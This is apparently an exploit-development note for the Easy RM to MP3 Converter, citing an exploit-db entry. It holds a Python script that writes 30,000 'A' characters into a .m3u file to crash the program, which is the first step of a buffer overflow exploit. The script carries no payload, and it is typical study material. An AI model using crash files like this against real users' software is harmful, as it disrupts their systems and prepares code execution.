# EasyRMtoMP3Converter

Downloaded from: https://www.exploit-db.com/exploits/10374

## Initial Crash

```py
#!/usr/bin/python 

file = "crash1.m3u"
f = open(file , "w")

CRASH_LEN = 30000  # change me

junk = "A" * CRASH_LEN
f.write(junk)
f.close()
```
